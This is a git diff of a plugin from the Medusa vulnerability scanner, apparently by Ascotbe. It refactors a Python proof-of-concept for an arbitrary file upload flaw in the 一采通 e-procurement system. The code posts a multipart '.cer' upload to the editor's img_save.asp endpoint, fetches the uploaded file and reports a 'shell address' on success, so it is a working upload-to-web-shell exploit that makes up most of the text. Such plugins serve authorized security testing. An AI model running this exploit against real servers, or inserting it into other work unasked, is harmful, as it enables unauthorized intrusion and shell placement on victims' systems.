@@ -3,7 +3,6 @@
 
 __author__ = 'Ascotbe'
 __times__ = '2019/10/13 22:12 PM'
-import urllib.parse
 import requests
 import re
 import ClassCongregation
@@ -23,26 +22,14 @@ class VulnerabilityInfo(object):
         self.info['version'] = "暂无"  # 这边填漏洞影响的版本
         self.info['details'] = Medusa  # 结果
 
-def UrlProcessing(url):
-    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
-        res = urllib.parse.urlparse(url)
-    else:
-        res = urllib.parse.urlparse('http://%s' % url)
-    return res.scheme, res.hostname, res.port
-
-def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
-    proxies=ClassCongregation.Proxies().result(proxies)
-    scheme, url, port = UrlProcessing(Url)
-    if port is None and scheme == 'https':
-        port = 443
-    elif port is None and scheme == 'http':
-        port = 80
-    else:
-        port = port
+def medusa(**kwargs)->None:
+    url = kwargs.get("Url")  # 获取传入的url参数
+    Headers = kwargs.get("Headers")  # 获取传入的头文件
+    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
     try:
         RD=ClassCongregation.randoms().result(20)
         payload = "/library/editornew/Editor/img_save.asp"
-        payload_url = scheme + "://" + url +":"+ str(port)+ payload
+        payload_url = url + payload
         data = '''
 ------WebKitFormBoundaryNjZKAB66SVyL1INA
 Content-Disposition: form-data; name="img_src"; filename="123.cer"
@@ -86,7 +73,7 @@ Content-Disposition: form-data; name="img_vspace"
         con = resp.text
         match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
         if match:
-            payload_url2 = scheme + "://" + url + ":" + str(port) + "/library/editornew/Editor/NewImage/"+match.group(1)
+            payload_url2 = url  + "/library/editornew/Editor/NewImage/"+match.group(1)
             resp2 = requests.get(payload_url2, headers=Headers, timeout=6,proxies=proxies, verify=False)
             con2 = resp2.text
             code2 = resp2.status_code
@@ -94,7 +81,7 @@ Content-Disposition: form-data; name="img_vspace"
             if code2 == 200 and con2.lower().find(RD) != -1:
                 Medusa = "{}存在一采通电子采购系统任意文件上传漏洞\r\n 验证数据:\r\nshell地址:{}\r\n内容:{}\r\n".format(url,payload_url2,con2)
                 _t=VulnerabilityInfo(Medusa)
-                ClassCongregation.VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
+                ClassCongregation.VulnerabilityDetails(_t.info, resp2,**kwargs).Write()  # 传入url和扫描到的数据
                 ClassCongregation.WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
     except Exception as e:
         _ = VulnerabilityInfo('').info.get('algroup')
